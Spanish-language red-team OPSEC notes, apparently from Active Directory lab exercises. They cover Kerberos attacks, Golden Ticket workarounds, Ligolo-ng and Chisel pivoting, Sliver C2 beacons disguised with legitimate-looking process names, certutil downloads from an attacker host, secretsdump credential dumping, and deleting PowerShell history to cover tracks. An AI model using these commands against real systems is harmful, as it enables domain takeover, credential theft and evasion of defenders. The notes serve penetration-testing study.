# 🥷 OPSEC Notes — Red Team Ops Roadmap

> Aprendizajes de seguridad operacional transversales a todos los labs.  
> No son notas de un lab concreto — son principios destilados de la experiencia acumulada.  
> Actualizar tras cada lab con nuevos insights.

---

## 📋 Índice

1. [Herramientas — Cuándo usar cada una](#1--herramientas--cuándo-usar-cada-una)
2. [Kerberos — Decisiones tácticas](#2--kerberos--decisiones-tácticas)
3. [Pivoting — Ligolo-ng vs Chisel](#3--pivoting--ligolo-ng-vs-chisel)
4. [C2 — Sliver operacional](#4--c2--sliver-operacional)
5. [Living-off-the-Land — Prioridades](#5--living-off-the-land--prioridades)
6. [Transferencia de herramientas](#6--transferencia-de-herramientas)
7. [Gestión del entorno de lab](#7--gestión-del-entorno-de-lab)
8. [Documentación operacional](#8--documentación-operacional)

---

## 1. 🛠️ Herramientas — Cuándo usar cada una

### Acceso remoto Windows

| Situación | Herramienta | Por qué |
|-----------|-------------|---------|
| Credenciales en claro + WinRM disponible | `evil-winrm` | Shell interactiva con upload/download integrado |
| Solo hash NTLM disponible | `evil-winrm -H <hash>` | Pass-the-Hash directo |
| SMB disponible + hash | `impacket-psexec / wmiexec` | Alternativa cuando WinRM no está abierto |
| Necesitas ejecución masiva en múltiples hosts | `crackmapexec` | Validación + ejecución en bloque |
| Sesión interactiva real (RDP) necesaria | `xfreerdp` | Necesario para algunos exploits (Potato) |

> **Nota Lab-01:** Los Potato attacks (PrintSpoofer, SweetPotato) **fallan en sesiones WinRM** porque generan Network tokens (Logon Type 3) en lugar de Interactive tokens. Requieren sesión RDP o consola física para funcionar. Si el entorno solo expone WinRM y necesitas LPE, busca vectores alternativos (Unquoted Path, AlwaysInstallElevated, Weak Service Perms).

---

### Cracking de hashes

| Situación | Herramienta | Modo |
|-----------|-------------|------|
| GPU disponible (físico/nativo) | `hashcat` | Máxima velocidad |
| VirtualBox / sin GPU | `john` | CPU eficiente, suficiente para labs |
| Hash AS-REP (`$krb5asrep$23$`) | `john --format=krb5asrep` o `hashcat -m 18200` | — |
| Hash TGS Kerberoasting (`$krb5tgs$23$`) | `john --format=krb5tgs` o `hashcat -m 13100` | — |
| Hash NTLM | `hashcat -m 1000` | — |

> **Principio:** Rockyou.txt primero para validar que el hash es crackeable. Si falla en < 5 min, construir diccionario dirigido con OSINT de la empresa objetivo (nombre empresa + año + símbolo especial). Los entornos corporativos casi nunca usan contraseñas de rockyou.

---

### Enumeración AD

| Necesidad | Herramienta | Cuándo usarla |
|-----------|-------------|---------------|
| Attack paths visuales | `BloodHound + SharpHound` | Siempre que haya foothold con credenciales |
| Enumeración rápida de ACLs desde PowerShell | `PowerView` | Desde shell Evil-WinRM, LOLBin alternativo |
| Análisis offline sin agente en dominio | `Adalanche` | Cuando no puedes ejecutar SharpHound |
| Enumeración SMB/usuarios sin credenciales | `enum4linux-ng` | Recon inicial sin autenticación |

---

## 2. 🎫 Kerberos — Decisiones tácticas

### Árbol de decisión: qué técnica usar

```
¿Tienes lista de usuarios del dominio?
│
├── NO → AS-REP Roasting ciego (GetNPUsers con lista de usuarios candidatos)
│         construir lista via: naming conventions + OSINT + SMB null session
│
└── SÍ → ¿Alguna cuenta tiene DoesNotRequirePreAuth?
          │
          ├── SÍ → AS-REP Roasting → hash offline → crack → credenciales
          │
          └── NO → ¿Hay cuentas con SPN?
                    │
                    ├── SÍ → Kerberoasting → TGS hash → crack → credenciales de servicio
                    │         ¿La cuenta de servicio tiene DA o ACL abusable?
                    │         └── SÍ → escalada directa
                    │
                    └── NO → Buscar otros vectores:
                              • SMB null session → shares con credenciales
                              • LDAP anónimo → usuarios y descriptions
                              • Web/IIS → credenciales en código fuente
```

### Pass-the-Ticket vs Pass-the-Hash

| Técnica | Cuándo preferirla | Evento generado | Requisito |
|---------|------------------|----------------|-----------|
| **Pass-the-Ticket** | Entornos con NTLM deshabilitado / Kerberos-only | 4768, 4769 (normal Kerberos) | Ticket TGT o TGS válido |
| **Pass-the-Hash** | NTLM habilitado, acceso SMB/WinRM | 4624 Logon Type 3, NTLM en red | Hash NTLM de la cuenta |

> **OPSEC APT29:** PtT genera tráfico Kerberos normal — indistinguible de autenticación legítima si el ticket es válido. PtH genera autenticación NTLM que puede ser detectada por soluciones que alertan sobre NTLM en dominios modernos.

### Golden Ticket — Limitaciones modernas

> **Aprendizaje Lab-01 (crítico):** El Golden Ticket clásico (`impacket-ticketer` con hash NTLM del krbtgt) **falla en Windows Server 2022** con error `KDC_ERR_TGT_REVOKED` por **PAC Validation**.

**Workarounds:**
- Usar AES256 del krbtgt en lugar de NTLM: `impacket-ticketer -aesKey <AES256> ...`
- Diamond Ticket (Rubeus): modifica un TGT legítimo en lugar de forjar uno — evita PAC Validation
- Si el objetivo es persistencia: scheduled task / registry run key es más fiable en entornos modernos

---

## 3. 🔀 Pivoting — Ligolo-ng vs Chisel

### Comparativa técnica

| Aspecto | Ligolo-ng | Chisel |
|---------|-----------|--------|
| **Capa de operación** | Kernel (tuntap interface) | Userspace (SOCKS5 proxy) |
| **Compatibilidad de herramientas** | 100% — cualquier herramienta funciona directo | Requiere `proxychains` o configuración SOCKS |
| **Nmap a través del túnel** | ✅ Directo (`nmap <IP_interna>`) | ⚠️ Limitado (SYN scan no funciona con proxychains) |
| **Velocidad** | Alta — tráfico nativo | Media — overhead SOCKS |
| **Detección** | Interfaz tun creada en host comprometido | Proceso con socket SOCKS escuchando |
| **Setup** | Más pasos (interfaz + ruta) | Más simple (server + client) |
| **Segundo pivote** | `listener_add` nativo en consola | Chisel en cadena |

### Cuándo usar cada uno

**Usar Ligolo-ng cuando:**
- Necesitas Nmap completo contra la red interna (SYN scan, scripts NSE)
- Sliver u otros C2 necesitan conectar directamente sin proxychains
- La operación involucra múltiples herramientas contra múltiples hosts internos
- Quieres tráfico transparente sin configurar proxychains en cada herramienta

**Usar Chisel cuando:**
- Solo necesitas un puerto específico redirigido (port forward simple)
- El host comprometido es Windows y no puedes crear interfaces de red
- Setup rápido para una única conexión

### Setup rápido Ligolo-ng (referencia)

```bash
# KALI — interfaz (una vez por sesión)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# HOST COMPROMETIDO
./agent -connect <KALI_IP>:11601 -ignore-cert &

# KALI — tras sesión activa en consola Ligolo-ng
ligolo-ng » session → ifconfig → start
sudo ip route add <RED_INTERNA>/24 dev ligolo
```

---

## 4. 📡 C2 — Sliver operacional

### Dónde desplegar el beacon

| Regla | Razón |
|-------|-------|
| **Nunca en el DC** | El Domain Controller es el activo más monitoreado. Un beacon en DC es detección inmediata en cualquier entorno con EDR/SIEM |
| **Preferir workstations sobre servidores** | Las workstations tienen menos monitorización y el tráfico web saliente es esperado |
| **Si hay múltiples hosts, beacon en el menos crítico** | Minimiza el impacto de la detección del beacon en la operación global |

### Tipos de beacon y cuándo usarlos

| Tipo | Protocolo | Cuándo |
|------|-----------|--------|
| `beacon --http` | HTTPS | Default — se mimetiza con tráfico web |
| `beacon --mtls` | mTLS | Cuando el entorno inspecciona HTTPS — tráfico TLS opaco |
| `beacon --dns` | DNS | Cuando solo hay salida DNS — más lento pero muy evasivo |
| `session` | mTLS/HTTPS | Interactivo — para acciones que requieren respuesta inmediata |

> **Diferencia beacon vs session en Sliver:** Un beacon es asíncrono (check-in cada N segundos — menos detectable). Una session es una conexión persistente bidireccional (más detectable pero interactiva). Para operaciones largas, usar beacons. Para acciones puntuales que requieren interactividad, abrir una session temporal desde el beacon.

### OPSEC en generación de implantes

```bash
# Siempre con symbol obfuscation (activo por defecto en Sliver)
generate beacon --http <KALI_IP>:443 --os windows --arch amd64 --format exe

# Para mayor evasión: usar perfil con jitter para variar el check-in
generate beacon --http <KALI_IP>:443 --jitter 30 --seconds 60 ...

# Nombre del archivo: evitar nombres obvios (beacon.exe, agent.exe)
# Usar nombres que imiten procesos legítimos: svchost_update.exe, Teams_helper.exe
```

---

## 5. 🏠 Living-off-the-Land — Prioridades

### Orden de preferencia en Discovery (Windows)

Antes de subir herramientas externas (BloodHound, PowerView), intentar con:

```powershell
# Identidad
whoami /all

# Red
ipconfig /all
route print
netstat -ano

# Dominio — usuarios y grupos
net user /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain

# SPNs — Kerberoasting candidatos
setspn -T <dominio> -Q */*

# Descriptions con contraseñas (sin PowerView)
$searcher = [adsisearcher]"(description=*)"
$searcher.FindAll() | % { $_.Properties['samaccountname','description'] }

# Trusts del dominio
nltest /domain_trusts
nltest /dclist:<dominio>

# ACLs abusables básico (sin PowerView)
(Get-Acl "AD:\CN=<usuario>,DC=...").Access | ? { $_.IdentityReference -match "nombre" }
```

> **Principio:** LOLBins primero — generan menos alertas porque son procesos firmados por Microsoft. Solo subir herramientas externas cuando los comandos nativos no son suficientes o el tiempo operacional lo requiere.

---

## 6. 📦 Transferencia de herramientas

### Métodos por situación

| Situación | Método | Comando |
|-----------|--------|---------|
| WinRM disponible | Evil-WinRM upload | `upload /ruta/local/herramienta.exe` |
| Solo SMB | SMB share temporal desde Kali | `impacket-smbserver share /tmp/tools -smb2support` → `copy \\KALI_IP\share\tool.exe .` |
| HTTP disponible | Python HTTP server | `python3 -m http.server 8888` → `wget / curl / certutil` |
| Restricciones de salida | Base64 encode | `cat tool.exe \| base64 -w 0` → pegar en PS → decode |

### Certutil como downloader (LOLBin Windows)

```cmd
certutil -urlcache -split -f http://<KALI_IP>:8888/tool.exe C:\Windows\Temp\tool.exe
```

> **OPSEC:** `certutil` deja traza en `%APPDATA%\Microsoft\CryptnetUrlCache`. En entornos con EDR, preferir PowerShell IEX o SMB.

### Limpieza post-transferencia

```powershell
# Borrar herramientas tras uso
Remove-Item C:\Windows\Temp\tool.exe -Force

# Borrar historial PowerShell
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force

# Limpiar certutil cache
certutil -urlcache -split -f http://nothing * del
```

---

## 7. 🖥️ Gestión del entorno de lab

### IP estática en Kali — siempre así

```bash
# NetworkManager persiste entre reinicios — NO usar ip addr add (no persiste)
sudo nmcli con add type ethernet con-name "LabRedTeam" ifname eth0 \
  ipv4.method manual ipv4.addresses 10.0.2.9/24 \
  ipv4.gateway 10.0.2.1 ipv4.dns 10.0.2.10 \
  connection.autoconnect yes
sudo nmcli con up LabRedTeam
```

### Interfaz Ligolo-ng — recrear si Kali se reinicia

```bash
# La interfaz tuntap no persiste entre reinicios
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
# La ruta tampoco persiste — añadirla de nuevo tras activar el túnel
```

### Permisos AD — cuándo aplican

> **Aprendizaje Lab-01:** Los permisos AD asignados a un usuario (DCSync ACLs, GenericWrite, etc.) **no se aplican en la sesión actual** del usuario si ya tenía un token de Kerberos cacheado. Aplican en el **siguiente logon**. Si un DCSync falla con ACCESS_DENIED pese a tener los permisos correctos, el usuario necesita cerrar sesión y volver a autenticarse.

### Nombres localizados en Windows

> Los grupos built-in tienen nombres distintos según el idioma del SO:

| Grupo (EN) | Grupo (ES) | SID universal |
|-----------|-----------|---------------|
| Domain Admins | Admins. del dominio | S-1-5-21-...-512 |
| Account Operators | Opers. de cuentas | S-1-5-32-548 |
| Remote Management Users | Usuarios de administración remota | S-1-5-32-580 |
| Administrators | Administradores | S-1-5-32-544 |

> **Regla:** En scripts PowerShell, **siempre buscar grupos por SID**, nunca por nombre. El SID es universal independientemente del idioma del SO.

---

## 8. 📝 Documentación operacional

### Flujo de trabajo por fase

```
1. ANTES de empezar la fase
   → Revisar el plan de operación (OPERATION_*.md)
   → Preparar directorio de capturas: FASE-X-Nombre/
   → Abrir terminal con tee para logging: script -a fase_X.log

2. DURANTE la fase
   → Captura de pantalla inmediatamente tras cada comando relevante
   → Nombrar capturas según convenio: faseX-NN-descripcion.png
   → Anotar en texto plano las IPs/credenciales obtenidas en tiempo real

3. DESPUÉS de completar la fase
   → Escribir el .md de documentación usando las capturas como referencia
   → Documentar desviaciones del plan con causa técnica
   → Actualizar PROGRESS.md con horas y lecciones
   → git add + commit con mensaje descriptivo
```

### Convención de naming para capturas

```
faseX-NN-descripcion-corta.png

Ejemplos:
  fase1-01-nmap-port-discovery.png
  fase3-02-ligolo-agent-connected.png
  fase7-04-sliver-beacon-connected.png

Reglas:
  X  = número de fase (1 dígito)
  NN = número secuencial dentro de la fase (2 dígitos: 01, 02...)
  descripcion = kebab-case, sin espacios, máximo 4 palabras
```

### Qué documentar cuando algo falla

> Los fallos son los momentos más valiosos del writeup. Documentar:
> 1. **Qué se intentó** — comando exacto
> 2. **Qué error se obtuvo** — output completo, sin omitir
> 3. **Análisis de causa** — por qué falló técnicamente
> 4. **Decisión táctica** — qué vector alternativo se tomó y por qué

> Ejemplo de Lab-01: DCSync `ACCESS_DENIED` → análisis → token cacheado → decisión de pivotar a Kerberoasting. Ese desvío es lo que hace el writeup valioso para alguien que lo lea después.

---

*Última actualización: Mayo 2026 — Lab-01 (APT29) + Lab-02 inicio (APT41) — Adrián Camacho*
---

## 9. 🩸 BloodHound — Recolección OPSEC

### bloodhound-python vs SharpHound

**Regla:** Usar siempre bloodhound-python como primera pasada. Solo subir SharpHound cuando se necesita coverage completo de ACLs/GPOs y ya se tiene acceso privilegiado.

```bash
# Primera pasada — solo tráfico LDAP desde Kali
bloodhound-python -u usuario -p password -d dominio -ns IP -c All --zip
```

| Criterio | bloodhound-python | SharpHound |
|----------|-------------------|------------|
| Binarios en objetivo | ❌ Ninguno | ✅ SharpHound.exe |
| Detección | Solo tráfico LDAP voluminoso | Proceso + eventos + AV |
| Coverage ACLs GPO | ⚠️ Parcial | ✅ Completo |
| Cuándo usarlo | Primera pasada siempre | Segunda pasada si se necesita GPO/ADCS paths |

---

## 10. 🎫 Kerberos — Sesiones WinRM vs interactivas

**Problema crítico:** Rubeus `ptt`, Potato attacks y cualquier manipulación de tokens Kerberos **falla en sesiones WinRM** porque WinRM usa Network Logon (Logon Type 3), que no permite modificar la caché de tickets.

**Solución:** Usar impacket desde Kali en lugar de intentar manipular tickets desde la shell WinRM.

```bash
# En lugar de ptt desde WinRM:
python3 -c "import base64; open('/tmp/ticket.ccache','wb').write(base64.b64decode(open('/tmp/ticket.b64').read()))"
export KRB5CCNAME=/tmp/ticket.ccache
impacket-secretsdump -k -no-pass DC-01.dominio.local
```

---

## 11. 🔑 ACL Abuse — Limpieza post-explotación

**Obligatorio:** Eliminar SPNs añadidos para Targeted Kerberoasting. Un SPN `fake/hostname` es un IOC obvio.

```bash
# Eliminar SPN después del ataque
bloodyAD -u usuario -p password -d dominio --host IP   set object cuenta_objetivo servicePrincipalName -v "SPN_ORIGINAL"
# O eliminar completamente:
bloodyAD ... set object cuenta servicePrincipalName -v ""
```

---

## 12. 🖥️ GPO Abuse — Restaurar configuración

**Obligatorio en engagements reales:** Eliminar las tareas creadas en SYSVOL después del ataque.

```powershell
# Eliminar ScheduledTasks.xml de SYSVOL
$gpoId = (Get-GPO -Name "GPO-NOMBRE").Id.ToString()
Remove-Item "\DC\SYSVOL\dominio\Policies\{$gpoId}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
```

---

## 13. 🌐 Kali — Configuración de red permanente

**Problema recurrente:** La default route de eth0 (red lab) bloquea el acceso a Internet tras reinicios.

**Solución permanente via NetworkManager:**
```bash
# eth0 — red lab, nunca default gateway
sudo nmcli con modify "LabRedTeam" ipv4.never-default yes
sudo nmcli con modify "LabRedTeam" +ipv4.routes "10.0.3.0/24 10.0.2.1"

# eth2 — NAT Internet, default con métrica baja
sudo nmcli con modify "Wired connection 1" ipv4.route-metric 50

# Verificar
sudo nmcli con up "LabRedTeam" && sudo nmcli con up "Wired connection 1"
ping -c 1 10.0.2.10 && ping -c 1 8.8.8.8
```